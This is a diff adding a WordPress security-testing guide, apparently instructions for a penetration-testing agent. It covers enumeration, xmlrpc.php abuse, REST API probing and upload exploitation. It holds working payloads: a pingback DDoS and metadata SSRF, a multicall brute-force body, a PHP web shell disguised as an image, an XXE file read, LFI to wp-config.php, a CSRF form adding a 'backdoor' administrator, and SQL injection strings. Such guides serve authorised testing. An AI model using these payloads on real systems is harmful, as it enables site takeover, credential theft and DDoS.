@@ -1,0 +1,414 @@
+<wordpress_security_guide>
+<title>WORDPRESS SECURITY TESTING</title>
+
+<critical>WordPress powers over 40% of websites, making it a prime target. Testing must cover plugin/theme vulnerabilities, xmlrpc.php attacks, wp-json REST API exploitation, user enumeration, wp-config.php exposure, upload directory exploitation, and admin panel security.</critical>
+
+<scope>
+- WordPress core version detection and known CVEs
+- Plugin vulnerability testing (outdated, vulnerable plugins)
+- Theme security issues
+- xmlrpc.php attacks (pingback DDoS, brute force amplification)
+- wp-json REST API exploitation
+- User enumeration techniques
+- wp-config.php exposure
+- Upload directory traversal and exploitation
+- Admin panel attacks
+- Database exposure
+</scope>
+
+<methodology>
+1. Fingerprint WordPress version and identify outdated core.
+2. Enumerate plugins and themes, check for vulnerabilities.
+3. Test xmlrpc.php for attacks (pingback, brute force).
+4. Exploit wp-json REST API endpoints.
+5. Enumerate users via multiple techniques.
+6. Search for wp-config.php exposure.
+7. Test file upload restrictions and directory access.
+8. Attempt admin panel authentication bypass.
+</methodology>
+
+<version_detection>
+{% raw %}
+# WordPress version detection:
+
+# Meta generator tag:
+curl -s https://example.com/ | grep -i 'generator.*wordpress'
+# <meta name="generator" content="WordPress 5.8.1" />
+
+# readme.html file:
+curl https://example.com/readme.html
+# Version listed at top
+
+# RSS feed:
+curl https://example.com/feed/
+# <generator>https://wordpress.org/?v=5.8.1</generator>
+
+# REST API:
+curl https://example.com/wp-json/
+# Look for "version" in response
+
+# Specific files by version:
+# Version 5.9+: /wp-includes/js/dist/vendor/wp-polyfill.min.js
+# Check file hashes against known versions
+
+# WPScan:
+wpscan --url https://example.com --enumerate vp,vt,u
+{% endraw %}
+</version_detection>
+
+<plugin_enumeration>
+{% raw %}
+# Plugin enumeration:
+
+# Passive (from HTML):
+curl -s https://example.com/ | grep -oP 'wp-content/plugins/\K[^/]+'  | sort -u
+
+# Active enumeration:
+# Common plugin paths:
+for plugin in $(cat common-plugins.txt); do
+  curl -I "https://example.com/wp-content/plugins/$plugin/" 2>/dev/null | grep -q "200 OK" && echo "Found: $plugin"
+done
+
+# Plugin version detection:
+curl https://example.com/wp-content/plugins/plugin-name/readme.txt
+# Look for "Stable tag:" line
+
+# REST API plugin enumeration:
+curl https://example.com/wp-json/wp/v2/plugins
+# May require authentication
+
+# Common vulnerable plugins:
+# - Contact Form 7 (file upload bypass)
+# - Yoast SEO (XSS in older versions)
+# - WooCommerce (various issues)
+# - Elementor (XSS, privilege escalation)
+# - wpDiscuz (arbitrary file upload)
+
+# Check against WPVulnDB:
+# https://wpscan.com/plugins/[plugin-slug]
+{% endraw %}
+</plugin_enumeration>
+
+<theme_enumeration>
+{% raw %}
+# Theme detection:
+
+# Passive (from HTML):
+curl -s https://example.com/ | grep -oP 'wp-content/themes/\K[^/]+'  | sort -u
+
+# Active:
+curl -I https://example.com/wp-content/themes/twentytwentyone/
+curl -I https://example.com/wp-content/themes/astra/
+
+# Theme version:
+curl https://example.com/wp-content/themes/theme-name/style.css
+# Look for "Version:" line
+
+# Common theme issues:
+# - Arbitrary file upload
+# - SQL injection in custom code
+# - XSS in custom fields
+# - Hardcoded credentials
+# - Exposed backup files
+{% endraw %}
+</theme_enumeration>
+
+<xmlrpc_attacks>
+{% raw %}
+# xmlrpc.php testing:
+
+# Check if enabled:
+curl -I https://example.com/xmlrpc.php
+# 200 OK = enabled
+
+# List methods:
+curl -X POST https://example.com/xmlrpc.php -d '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>'
+
+# Pingback DDoS:
+# Abuse pingback to DDoS third-party:
+curl -X POST https://example.com/xmlrpc.php -d '<?xml version="1.0"?><methodCall><methodName>pingback.ping</methodName><params><param><value><string>http://attacker.com/post</string></value></param><param><value><string>http://target.com/</string></value></param></params></methodCall>'
+
+# SSRF via pingback:
+curl -X POST https://example.com/xmlrpc.php -d '<?xml version="1.0"?><methodCall><methodName>pingback.ping</methodName><params><param><value><string>http://example.com/post</string></value></param><param><value><string>http://169.254.169.254/latest/meta-data/</string></value></param></params></methodCall>'
+
+# Brute force amplification:
+# Single request tests multiple credentials:
+curl -X POST https://example.com/xmlrpc.php -d '<?xml version="1.0"?><methodCall><methodName>system.multicall</methodName><params><param><value><array><data><value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name><value><array><data><value><array><data><value><string>admin</string></value><value><string>password1</string></value></data></array></value></data></array></value></member></struct></value><value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name><value><array><data><value><array><data><value><string>admin</string></value><value><string>password2</string></value></data></array></value></data></array></value></member></struct></value></data></array></value></param></params></methodCall>'
+{% endraw %}
+</xmlrpc_attacks>
+
+<rest_api_exploitation>
+{% raw %}
+# wp-json REST API testing:
+
+# Discover endpoints:
+curl https://example.com/wp-json/
+
+# User enumeration:
+curl https://example.com/wp-json/wp/v2/users
+
+# Post enumeration:
+curl https://example.com/wp-json/wp/v2/posts
+curl https://example.com/wp-json/wp/v2/pages
+
+# Media files:
+curl https://example.com/wp-json/wp/v2/media
+
+# Unauthenticated post creation (pre-4.7.2):
+curl -X POST https://example.com/wp-json/wp/v2/posts -d '{"title":"Hacked","content":"Defaced","status":"publish"}' -H "Content-Type: application/json"
+
+# Privilege escalation (CVE-2019-17671):
+# Modify user roles via REST API
+curl -X POST https://example.com/wp-json/wp/v2/users/1 -d '{"roles":["administrator"]}' -H "Content-Type: application/json" -H "Authorization: Bearer [token]"
+
+# Custom endpoints from plugins:
+curl https://example.com/wp-json/myplugin/v1/
+# Test for authentication bypass, injection
+
+# REST API IDOR:
+curl https://example.com/wp-json/wp/v2/users/1
+curl https://example.com/wp-json/wp/v2/users/2
+# Access other users' data
+{% endraw %}
+</rest_api_exploitation>
+
+<user_enumeration>
+{% raw %}
+# WordPress user enumeration:
+
+# Method 1: Author archives
+curl https://example.com/?author=1
+# Redirects to: https://example.com/author/admin/
+# Username: admin
+
+# Loop through IDs:
+for i in {1..10}; do
+  curl -s -I https://example.com/?author=$i | grep -i location
+done
+
+# Method 2: Login error messages
+curl -X POST https://example.com/wp-login.php -d "log=admin&pwd=wrong"
+# Error: "The password you entered for the username admin is incorrect"
+# Confirms username exists
+
+curl -X POST https://example.com/wp-login.php -d "log=nonexistent&pwd=wrong"
+# Error: "Unknown username. Check again or try your email address."
+
+# Method 3: REST API
+curl https://example.com/wp-json/wp/v2/users
+# Returns all users with id, name, slug
+
+# Method 4: RSS/Atom feeds
+curl https://example.com/feed/
+# Look for <dc:creator> tags
+
+# Method 5: Oembed
+curl https://example.com/wp-json/oembed/1.0/embed?url=https://example.com/?author=1
+# Returns author name in response
+{% endraw %}
+</user_enumeration>
+
+<wp_config_exposure>
+{% raw %}
+# wp-config.php exposure testing:
+
+# Direct access (should be blocked):
+curl https://example.com/wp-config.php
+curl https://example.com/wp-config.php.bak
+curl https://example.com/wp-config.old
+curl https://example.com/wp-config.txt
+
+# Backup files:
+curl https://example.com/wp-config.php~
+curl https://example.com/wp-config.php.swp
+curl https://example.com/.wp-config.php.swp
+curl https://example.com/wp-config.php.save
+
+# Path traversal:
+curl https://example.com/wp-admin/setup-config.php?step=1
+# May reveal wp-config.php path
+
+# Through vulnerable plugin LFI:
+curl https://example.com/wp-content/plugins/vulnerable-plugin/download.php?file=../../../../wp-config.php
+
+# Contains database credentials:
+# define('DB_NAME', 'wordpress');
+# define('DB_USER', 'wp_user');
+# define('DB_PASSWORD', 'secret_password');
+# define('DB_HOST', 'localhost');
+# Auth keys and salts
+{% endraw %}
+</wp_config_exposure>
+
+<upload_exploitation>
+{% raw %}
+# Upload directory exploitation:
+
+# Directory listing:
+curl https://example.com/wp-content/uploads/
+# Should return 403 Forbidden, not directory listing
+
+# Arbitrary file upload via plugin:
+# Upload PHP file with image extension:
+POST /wp-content/plugins/vulnerable/upload.php
+Content-Type: multipart/form-data
+
+file: shell.php.jpg
+Content: <?php system($_GET['cmd']); ?>
+
+# Access uploaded file:
+curl https://example.com/wp-content/uploads/2024/01/shell.php.jpg?cmd=id
+
+# .htaccess upload:
+# Upload .htaccess to make .jpg executable:
+AddType application/x-httpd-php .jpg
+
+# Path traversal in upload:
+filename: ../../../../var/www/html/shell.php
+
+# Media library XXE:
+# Upload malicious XML/SVG:
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
+<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<text>&xxe;</text>
+</svg>
+{% endraw %}
+</upload_exploitation>
+
+<admin_panel_attacks>
+{% raw %}
+# Admin panel security testing:
+
+# Default credentials:
+admin:admin
+admin:password
+admin:wordpress
+
+# Brute force:
+wpscan --url https://example.com --passwords passwords.txt --usernames admin
+
+# Using xmlrpc.php for brute force (faster):
+# system.multicall method allows multiple attempts in one request
+
+# SQL injection in admin:
+# Search for vulnerable plugins used in admin panel
+# Custom queries in theme/plugin admin pages
+
+# Privilege escalation:
+# User with editor role attempts to access admin functions
+# Test plugin-specific capabilities
+
+# CSRF to add admin user:
+<form action="https://example.com/wp-admin/user-new.php" method="POST">
+  <input name="action" value="createuser">
+  <input name="user_login" value="backdoor">
+  <input name="email" value="backdoor@evil.com">
+  <input name="pass1" value="Password123!">
+  <input name="pass2" value="Password123!">
+  <input name="role" value="administrator">
+</form>
+<script>document.forms[0].submit();</script>
+{% endraw %}
+</admin_panel_attacks>
+
+<database_access>
+{% raw %}
+# Database exposure testing:
+
+# phpMyAdmin detection:
+curl -I https://example.com/phpmyadmin/
+curl -I https://example.com/pma/
+curl -I https://example.com/mysql/
+
+# SQL dumps in web root:
+curl https://example.com/backup.sql
+curl https://example.com/database.sql
+curl https://example.com/wp-content/backup-db.sql
+
+# SQL injection in plugins:
+# Check plugin parameters:
+GET /wp-content/plugins/vulnerable/ajax.php?id=1' OR '1'='1
+
+# Direct database access via SSH/credentials:
+# If wp-config.php exposed, use DB credentials
+mysql -h localhost -u wp_user -p'secret_password' wordpress
+{% endraw %}
+</database_access>
+
+<common_payloads>
+{% raw %}
+# User enumeration:
+/?author=1
+/wp-json/wp/v2/users
+
+# xmlrpc brute force:
+system.multicall with multiple credentials
+
+# File upload:
+shell.php.jpg with PHP code
+.htaccess to execute .jpg files
+
+# REST API unauthorized access:
+/wp-json/wp/v2/posts
+/wp-json/wp/v2/users/1
+
+# Path traversal:
+../../../../wp-config.php
+../../../etc/passwd
+
+# Admin CSRF:
+Create admin user via CSRF
+
+# SQL injection:
+' OR '1'='1--
+' UNION SELECT user,pass FROM wp_users--
+{% endraw %}
+</common_payloads>
+
+<validation>
+1. Demonstrate WordPress version detection and known CVE applicability.
+2. Show vulnerable plugin/theme with proof-of-concept exploit.
+3. Prove xmlrpc.php abuse (pingback SSRF, brute force amplification).
+4. Document REST API unauthorized access or IDOR.
+5. Show wp-config.php exposure with database credentials.
+6. Demonstrate arbitrary file upload and code execution.
+7. Prove user enumeration via multiple methods.
+</validation>
+
+<false_positives>
+- Updated WordPress core (latest version)
+- All plugins and themes updated
+- xmlrpc.php disabled
+- REST API properly authenticated and rate-limited
+- Strong admin passwords with 2FA
+- File upload restrictions enforced
+- wp-config.php properly protected
+- User enumeration mitigated (same error messages, disabled author pages)
+</false_positives>
+
+<impact>
+- Complete site takeover via vulnerable plugins
+- Mass DDoS using pingback amplification
+- Brute force attacks via xmlrpc.php
+- User data exposure via REST API
+- Database compromise via wp-config.php exposure
+- Remote Code Execution via file upload
+- Admin account creation via CSRF
+- SEO spam and defacement
+</impact>
+
+<pro_tips>
+1. Always check WordPress core, plugin, and theme versions.
+2. Test xmlrpc.php first - often enabled and exploitable.
+3. REST API user enumeration is the easiest method.
+4. Search for wp-config.php backups and variations.
+5. Test upload functionality in all plugins.
+6. Look for SQL injection in plugin admin pages.
+7. CSRF is common in admin functionality.
+8. Check WPScan vulnerability database for known issues.
+9. Test both authenticated and unauthenticated REST API endpoints.
+10. Don't forget database backup files in web root.
+</pro_tips>
+
+<remember>WordPress security depends on: updated core/plugins/themes, disabled xmlrpc.php, protected wp-config.php, secure file uploads, and proper authentication. Most critical: vulnerable plugins (check WPScan DB), xmlrpc.php abuse (pingback SSRF, brute force amplification), REST API user enumeration, wp-config.php exposure (database credentials). Common entry points: outdated plugins, file upload in media/forms, SQL injection in plugin parameters. Always enumerate plugins/themes first, then check for known vulnerabilities.</remember>
+</wordpress_security_guide>
